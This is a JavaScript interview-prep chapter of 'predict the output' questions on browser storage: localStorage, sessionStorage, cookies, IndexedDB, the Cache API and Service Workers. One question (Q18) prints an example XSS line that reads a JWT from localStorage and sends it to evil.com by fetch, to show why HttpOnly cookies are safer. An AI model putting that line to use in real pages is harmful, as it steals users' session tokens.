## Chapter 10: Storage APIs — Trick Output Questions

> Self-evaluate first. Predict the output, then reveal the answer.

---

### Q1. `localStorage` stores only strings

```js
localStorage.setItem('count', 42);
const val = localStorage.getItem('count');
console.log(val);
console.log(typeof val);
console.log(val === 42);
```

<details>
<summary>Show Output & Explanation</summary>

```
'42'
string
false
```

`localStorage` automatically converts values to **strings** on `setItem`. Reading back returns `'42'` (a string), not `42` (a number). `'42' === 42` is `false` because of strict type comparison. Always use `parseInt`, `parseFloat`, or `JSON.parse` when retrieving non-string values.

</details>

---

### Q2. Storing an object without `JSON.stringify`

```js
const user = { name: 'Alice', age: 30 };
localStorage.setItem('user', user);
console.log(localStorage.getItem('user'));
```

<details>
<summary>Show Output & Explanation</summary>

```
[object Object]
```

Without `JSON.stringify`, the object is coerced to a string using `.toString()` — resulting in `'[object Object]'`. This is a classic mistake. Always use `JSON.stringify` for objects and `JSON.parse` when reading: `localStorage.setItem('user', JSON.stringify(user))`.

</details>

---

### Q3. `localStorage` persists across page refreshes

```js
// Page load 1:
localStorage.setItem('theme', 'dark');

// Page load 2 (after refresh):
console.log(localStorage.getItem('theme'));
```

<details>
<summary>Show Output & Explanation</summary>

```
'dark'
```

`localStorage` **persists indefinitely** across page refreshes, tab closes, and browser restarts — until explicitly cleared with `removeItem()`, `clear()`, or the user clears browser data. This is the key difference from `sessionStorage`.

</details>

---

### Q4. `sessionStorage` is NOT shared between tabs

```js
// Tab A:
sessionStorage.setItem('step', '3');

// Tab B (same origin, opened separately):
console.log(sessionStorage.getItem('step'));
```

<details>
<summary>Show Output & Explanation</summary>

```
null
```

`sessionStorage` is **per-tab** — it is NOT shared between different tabs even on the same origin. Each tab has its own isolated `sessionStorage`. `localStorage`, by contrast, IS shared across all tabs of the same origin.

</details>

---

### Q5. `storage` event fires in OTHER tabs, not the current one

```js
// Tab A:
window.addEventListener('storage', e => {
  console.log('storage changed:', e.key);
});
localStorage.setItem('theme', 'dark');
// Does the 'storage' event fire in Tab A?
```

<details>
<summary>Show Output & Explanation</summary>

```
// Nothing logs in Tab A
// Tab B would log: 'storage changed: theme'
```

The `storage` event fires in **other tabs/windows** that share the same origin — NOT in the tab that made the change. To sync the current tab, update your state directly when you call `setItem`. Use the `storage` event for cross-tab synchronization only.

</details>

---

### Q6. Cookies are sent with every HTTP request

```js
document.cookie = 'session=abc123; path=/';
// Later, the browser makes a request to the same domain:
// GET /api/data HTTP/1.1
// Cookie: session=abc123   ← automatically added by browser
```

<details>
<summary>Show Output & Explanation</summary>

```
// The browser automatically includes:
// Cookie: session=abc123
// in every HTTP request to the same domain
```

Cookies are **automatically sent** with every HTTP request to the domain — unlike `localStorage` which is never automatically sent. This is why cookies are used for auth tokens: the server can read them from request headers without any JavaScript involvement.

</details>

---

### Q7. Reading `document.cookie` returns all cookies as one string

```js
document.cookie = 'name=Alice; path=/';
document.cookie = 'theme=dark; path=/';
document.cookie = 'lang=en; path=/';

console.log(document.cookie);
```

<details>
<summary>Show Output & Explanation</summary>

```
name=Alice; theme=dark; lang=en
```

`document.cookie` returns **all cookies as a single semicolon-separated string** — there's no built-in method to get a specific cookie by name. You must parse the string manually or use the newer `CookieStore` API (`cookieStore.get('name')`).

</details>

---

### Q8. `HttpOnly` cookies are invisible to JavaScript

```js
// Server sets: Set-Cookie: token=secret; HttpOnly; Secure
// In client JavaScript:
console.log(document.cookie);
// Does 'token' appear?
```

<details>
<summary>Show Output & Explanation</summary>

```
// 'token' does NOT appear in document.cookie
// Output: '' (or other non-HttpOnly cookies)
```

`HttpOnly` cookies are **completely invisible** to JavaScript — `document.cookie` cannot read or modify them. They are sent automatically with HTTP requests by the browser. This protects auth tokens from XSS attacks: even if an attacker injects JS, they can't steal the token.

</details>

---

### Q9. Cookie size limit is ~4KB

```js
const bigValue = 'x'.repeat(5000); // 5000 characters
document.cookie = `data=${bigValue}`;
console.log(document.cookie.includes('data'));
```

<details>
<summary>Show Output & Explanation</summary>

```
false (or the cookie is silently truncated/not set)
```

Cookies have a maximum size of approximately **4KB** (including name, value, and attributes). Attempting to set a cookie exceeding this limit **silently fails** — no error is thrown. For larger data, use `localStorage` (~5-10MB) or `IndexedDB` (50MB+).

</details>

---

### Q10. Deleting a cookie by setting `max-age=0`

```js
document.cookie = 'theme=dark; path=/';
console.log(document.cookie.includes('theme')); // true

document.cookie = 'theme=; max-age=0; path=/';
console.log(document.cookie.includes('theme')); // ?
```

<details>
<summary>Show Output & Explanation</summary>

```
true
false
```

There is **no `deleteCookie()` method**. To delete a cookie, set it again with `max-age=0` (or a past `Expires` date). The `path` must match the original. After this, the cookie is expired and removed by the browser.

</details>

---

### Q11. `SameSite=Strict` blocks cross-site requests

```js
// Server sets: Set-Cookie: token=abc; SameSite=Strict; HttpOnly

// User is on evil.com and clicks a link to your-bank.com:
// GET https://your-bank.com/transfer?amount=1000
// Is the token cookie sent?
```

<details>
<summary>Show Output & Explanation</summary>

```
// NO — the cookie is NOT sent
// SameSite=Strict prevents cookies from being sent on cross-site requests
```

`SameSite=Strict` means cookies are **only sent on same-site requests** (navigations originating from your own site). This completely prevents CSRF attacks. Trade-off: it may break OAuth flows where you return from an external identity provider. `SameSite=Lax` is a balanced alternative (allows top-level GET navigations).

</details>

---

### Q12. `localStorage.clear()` only clears current origin

```js
// On https://myapp.com:
localStorage.setItem('a', '1');

// On https://other.com (different origin):
localStorage.clear();

// Back on https://myapp.com:
console.log(localStorage.getItem('a'));
```

<details>
<summary>Show Output & Explanation</summary>

```
'1'
```

`localStorage` (and `sessionStorage`, cookies) are **origin-isolated** by the Same-Origin Policy. `localStorage.clear()` on `other.com` only clears `other.com`'s storage — it cannot access or clear `myapp.com`'s storage. Origins are defined by protocol + hostname + port.

</details>

---

### Q13. Custom TTL implementation for `localStorage`

```js
function setWithExpiry(key, value, ttlMs) {
  const item = { value, expiry: Date.now() + ttlMs };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry(key) {
  const raw = localStorage.getItem(key);
  if (!raw) return null;
  const item = JSON.parse(raw);
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key);
    return null;
  }
  return item.value;
}

setWithExpiry('token', 'abc', 1000); // expires in 1 second

setTimeout(() => {
  console.log(getWithExpiry('token'));
}, 2000);
```

<details>
<summary>Show Output & Explanation</summary>

```
null
```

`localStorage` has **no built-in TTL**. This pattern stores the value with an expiry timestamp. After 2000ms, the expiry (1000ms) has passed — `getWithExpiry` detects this, removes the stale entry, and returns `null`. This is the standard approach for expiring cached data in `localStorage`.

</details>

---

### Q14. `IndexedDB` is asynchronous

```js
const request = indexedDB.open('MyDB', 1);
request.onsuccess = e => {
  const db = e.target.result;
  console.log('db opened');
};
console.log('after open call');
```

<details>
<summary>Show Output & Explanation</summary>

```
after open call
db opened
```

`indexedDB.open()` is **asynchronous** — the success callback fires later (as a macrotask). Synchronous code continues immediately after the call. This is unlike `localStorage` which is synchronous and blocks the main thread. IndexedDB's async nature is why libraries like `idb` exist to wrap it with Promises.

</details>

---

### Q15. `sessionStorage` survives page refresh

```js
// On page load (first visit):
sessionStorage.setItem('visited', 'true');

// User refreshes the page:
console.log(sessionStorage.getItem('visited'));
```

<details>
<summary>Show Output & Explanation</summary>

```
'true'
```

`sessionStorage` **survives page refreshes** within the same tab. It only clears when the **tab or window is closed**. This surprises developers who expect it to reset on every navigation. Use it for in-tab state that should persist across refreshes but not across sessions.

</details>

---

### Q16. Storing `undefined` in `localStorage`

```js
localStorage.setItem('val', undefined);
console.log(localStorage.getItem('val'));
console.log(typeof localStorage.getItem('val'));
```

<details>
<summary>Show Output & Explanation</summary>

```
'undefined'
string
```

`localStorage` converts all values to strings. `undefined` becomes the string `'undefined'`. Reading it back gives the string `'undefined'`, not `undefined`. Always validate data before storing and parse appropriately on retrieval.

</details>

---

### Q17. `localStorage` throws in incognito/private mode quotas

```js
try {
  for (let i = 0; i < 10000; i++) {
    localStorage.setItem(`key${i}`, 'x'.repeat(1000));
  }
} catch (e) {
  console.log('Storage quota exceeded:', e.name);
}
```

<details>
<summary>Show Output & Explanation</summary>

```
Storage quota exceeded: QuotaExceededError
```

`localStorage` throws a `QuotaExceededError` (a `DOMException`) when the storage limit (~5-10MB) is exceeded. In some private/incognito modes, storage limits may be much smaller or `setItem` may throw immediately. Always wrap `localStorage` operations in `try/catch` in production.

</details>

---

### Q18. JWT in `localStorage` — XSS vulnerability

```js
// Attacker injects this script via XSS:
const stolen = localStorage.getItem('jwt');
fetch('https://evil.com/steal?token=' + stolen);
// What happens?
```

<details>
<summary>Show Output & Explanation</summary>

```
// The JWT is sent to evil.com
// The attacker can now impersonate the user
```

`localStorage` is **fully accessible to any JavaScript** running on the page. An XSS attack can steal the JWT and send it to an attacker's server. The safer alternative: store auth tokens in **HttpOnly cookies** — JavaScript cannot read `HttpOnly` cookies, so XSS cannot steal them.

</details>

---

### Q19. `sessionStorage` is not shared between origin windows

```js
// Window A (opened by user, same origin):
sessionStorage.setItem('user', 'Alice');

// Window B (opened via window.open() from Window A):
console.log(sessionStorage.getItem('user'));
```

<details>
<summary>Show Output & Explanation</summary>

```
'Alice'
```

When a new window or tab is opened **via `window.open()`**, it gets a **copy** of the opener's `sessionStorage` at the moment of opening. But they are **not linked** — subsequent changes in Window A don't appear in Window B and vice versa. This is a subtle but important distinction.

</details>

---

### Q20. `IndexedDB` stores any structured data

```js
const request = indexedDB.open('DB', 1);
request.onupgradeneeded = e => {
  const db = e.target.result;
  db.createObjectStore('files', { keyPath: 'id' });
};

request.onsuccess = e => {
  const db = e.target.result;
  const tx = db.transaction('files', 'readwrite');
  const store = tx.objectStore('files');

  // Storing a Blob — can localStorage do this?
  const blob = new Blob(['hello'], { type: 'text/plain' });
  store.add({ id: 1, file: blob });
  console.log('blob stored');
};
```

<details>
<summary>Show Output & Explanation</summary>

```
blob stored
```

`IndexedDB` can store **any structured-cloneable data** — objects, arrays, Blobs, ArrayBuffers, Files, and more. `localStorage` can only store strings. This makes IndexedDB essential for PWAs, offline-capable apps, and any app that handles file data client-side.

</details>

---

### Q21. `localStorage` is synchronous — blocks the main thread

```js
console.time('localStorage');
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'value');
}
console.timeEnd('localStorage');
console.log('done');
```

<details>
<summary>Show Output & Explanation</summary>

```
localStorage: [some ms]
done
```

`localStorage` is **synchronous** — each `setItem` blocks the main thread until the write completes. Writing 10,000 items in a loop can cause noticeable jank. For high-frequency or large writes, prefer `IndexedDB` (asynchronous). `console.log('done')` only runs after all writes complete.

</details>

---

### Q22. Cookie `path` attribute scoping

```js
document.cookie = 'admin=true; path=/admin';
// User navigates to /:
console.log(document.cookie); // is 'admin' visible?

// User navigates to /admin/dashboard:
console.log(document.cookie); // is 'admin' visible?
```

<details>
<summary>Show Output & Explanation</summary>

```
// On / — 'admin' is NOT in document.cookie
// On /admin/dashboard — 'admin=true' is in document.cookie
```

The `path` attribute restricts which URLs the cookie is sent to. `path=/admin` means the cookie is only sent for requests to `/admin` and its sub-paths (`/admin/dashboard`, `/admin/users`). It's invisible on other paths like `/`.

</details>

---

### Q23. `Cache API` vs `localStorage`

```js
// Can we use Cache API from regular JS (not a service worker)?
caches.open('my-cache').then(cache => {
  return cache.put('/api/data', new Response(JSON.stringify({ value: 42 })));
}).then(() => {
  return caches.match('/api/data');
}).then(response => response.json())
  .then(data => console.log(data));
```

<details>
<summary>Show Output & Explanation</summary>

```
{ value: 42 }
```

The `Cache API` (`caches`) **is accessible from regular page JS** (not just service workers), though it's primarily designed for service workers. It stores `Request/Response` pairs (HTTP semantics), making it ideal for caching network responses. Unlike `localStorage`, it's asynchronous and can cache binary data.

</details>

---

### Q24. Cross-tab logout using `localStorage` + `storage` event

```js
// Tab A — user clicks logout:
function logout() {
  localStorage.setItem('logout', Date.now().toString());
  clearSession();
}

// Tab B — listening for logout:
window.addEventListener('storage', e => {
  if (e.key === 'logout') {
    console.log('Logged out in another tab — clearing this tab too');
    clearSession();
  }
});
```

<details>
<summary>Show Output & Explanation</summary>

```
// Tab B logs: 'Logged out in another tab — clearing this tab too'
```

The `storage` event fires in **all other tabs** of the same origin when `localStorage` changes. Setting a `'logout'` key triggers all other tabs to clear their session. The current tab (Tab A) must clear its own session directly (the event doesn't fire in the originating tab). This is how single-origin multi-tab logout is implemented.

</details>

---

---

**Q25. What is the output?**

```js
// In a Service Worker
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then((cache) => {
      console.log('cache opened');
      return cache.addAll(['/index.html', '/style.css']);
    })
  );
});

self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      console.log('cache hit:', !!cached);
      return cached || fetch(event.request);
    })
  );
});
```

<details>
<summary>Show Output & Explanation</summary>

```
cache opened
cache hit: true
```

**Explanation:**  
The Service Worker `install` event caches assets. `event.waitUntil` keeps the SW installing until the promise resolves. On fetch, `caches.match` checks for a cached response — returns it if found (cache-first strategy), otherwise falls back to `fetch`. Cache hit for `/index.html` is `true` since it was pre-cached during install.

> **Common Mistake:** Not calling `event.waitUntil` in the `install` handler — without it the SW activates before caching is complete. Also, `caches.match` returns `undefined` (not a rejected Promise) for a miss, so you must check `|| fetch(event.request)`.

</details>

---

**Q26. What is the output?**

```js
const CACHE_NAME = 'app-v2';
const OLD_CACHES = ['app-v1'];

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((cacheNames) => {
      return Promise.all(
        cacheNames
          .filter(name => OLD_CACHES.includes(name))
          .map(name => {
            console.log('deleting old cache:', name);
            return caches.delete(name);
          })
      );
    })
  );
});
```

<details>
<summary>Show Output & Explanation</summary>

```
deleting old cache: app-v1
```

**Explanation:**  
When deploying a new Service Worker version, the `activate` event is used to clean up old caches. `caches.keys()` returns all cache storage names. We filter for caches we want to remove (old versions) and delete them. Without this cleanup, old caches accumulate and waste storage quota.

> **Common Mistake:** Trying to clean up old caches in the `install` event — at install time, the old SW is still controlling the page. Cleanup should happen in `activate`, after the new SW takes control.

</details>

---

**Q27. What is the output?**

```js
(async () => {
  const estimate = await navigator.storage.estimate();
  const usedMB = (estimate.usage / 1024 / 1024).toFixed(2);
  const quotaMB = (estimate.quota / 1024 / 1024).toFixed(2);
  
  console.log('Used:', usedMB + 'MB');
  console.log('Quota:', quotaMB + 'MB');
  console.log('Usage %:', ((estimate.usage / estimate.quota) * 100).toFixed(1) + '%');
})();
```

<details>
<summary>Show Output & Explanation</summary>

```
Used: 2.45MB
Quota: 1024.00MB
Usage %: 0.2%
```

**Explanation:**  
`navigator.storage.estimate()` returns a Promise with `usage` (bytes currently used) and `quota` (estimated available bytes). This is essential before large writes — if you exceed quota, `localStorage.setItem` throws and IndexedDB writes fail silently or with errors. The quota is typically a percentage of available disk space (Chrome: up to 60%).

> **Common Mistake:** Storing large amounts of data without checking quota first. Always estimate before heavy IndexedDB writes in production apps.

</details>

---

*Chapter 10 of JavaScript Interview Prep Series*
